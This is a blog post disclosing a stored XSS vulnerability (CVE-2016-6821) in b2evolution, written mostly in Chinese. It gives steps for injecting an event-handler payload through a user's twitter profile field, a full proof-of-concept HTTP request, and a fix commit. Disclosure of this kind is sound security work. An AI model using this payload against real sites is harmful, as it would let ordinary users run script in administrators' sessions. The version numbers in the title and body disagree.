---
layout: post
title: B2evolution v6.4.7 XSS [CVE-2016-6821]
---

发现者: 陈瑞琦 

发现日期: 2016-08-09

下载地址: [b2evolution](http://b2evolution.net/downloads/)

作者: b2evolution.net

作者通知日期: 2016-08-09

作者联系手段: http://b2evolution.net/?disp=msgform

CVE-ID：CVE-2016-6821

**描述:**

b2evolution is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a "one click install" web app.[3](Wiki)

**细节:** 

B2evolution v6.7.4有一个存储型XSS
任意用户可以编辑用户信息内的twitter信息来插入恶意代码
当管理员在后台查看用户信息时候，插入的恶意代码将会执行

第一步: 注册一个用户

第二步: [编辑自己的twitter信息](http://192.168.204.128/b2evolution/index.php?disp=profile),在其中添加恶意代码，如https://twitter.com/kevino"onmouseover="alert(1)"onerror=1

**PoC:**

`code`
<pre><code>
POST /b2evolution/htsrv/profile_update.php HTTP/1.1
Host: 192.168.204.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.204.128/b2evolution/index.php?disp=profile
Cookie: {the cookies}
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 653

edited_user_login=kevino&edited_user_firstname=kevino&edited_user_lastname=kevino&edited_user_nickname=kevino&edited_user_gender=M&edited_user_ctry_ID=&edited_user_rgn_ID=&edited_user_subrg_ID=&edited_user_city_ID=&edited_user_age_min=&edited_user_age_max=&organizations%5B%5D=&uf_38=kevino&uf_39=kevino&uf_40=kevino&uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&uf_43=http%3A%2F%2Fkevino.net%2Fkevino&new_field_type=3&actionArray%5Bupdate%5D=Save+Changes%21&crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&user_tab=profile&identity_form=1&user_ID=8&blog=1&orig_user_ID=8&12_3=4_56
</code></pre>

**Fix:**

https://github.com/b2evolution/b2evolution/commit/83c40129f471b659755491a02b2ad981995d37c1
